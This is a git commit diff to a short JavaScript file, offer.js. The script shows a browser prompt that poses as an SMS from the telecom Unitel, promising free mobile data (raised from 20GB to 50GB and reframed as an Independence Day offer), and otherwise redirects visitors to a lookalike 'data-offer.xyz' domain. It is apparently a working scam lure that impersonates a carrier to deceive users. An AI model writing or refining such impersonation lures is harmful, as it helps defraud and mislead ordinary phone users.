f3ef1663091fc63325f9ab112c4bb30d0529b457
essac5 <154714847+essac5@users.noreply.github.com>
2024-11-10 05:55:36 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '20GB de dados gratuitos'
-password=prompt('SMS: Parabéns, seu número é elegível para receber 20GB UNITEL DADOS GRÁTIS RECOMPENSA SIM ANTIGO, pressione OK para ATIVAR ','20GB de dados gratuitos');
-if (password != '20GB de dados gratuitos') {
+var password = '50GB de dados gratuitos'
+password=prompt('SMS: Parabéns, seu número está qualificado para receber a OFERTA DE COMEMORAÇÃO DO DIA DA INDEPENDÊNCIA DA UNITEL de 50GB, pressione OK para ATIVAR ','50GB de dados gratuitos');
+if (password != '50GB de dados gratuitos') {
 location.href='https://unitel.data-offer.xyz/15GB';
 }
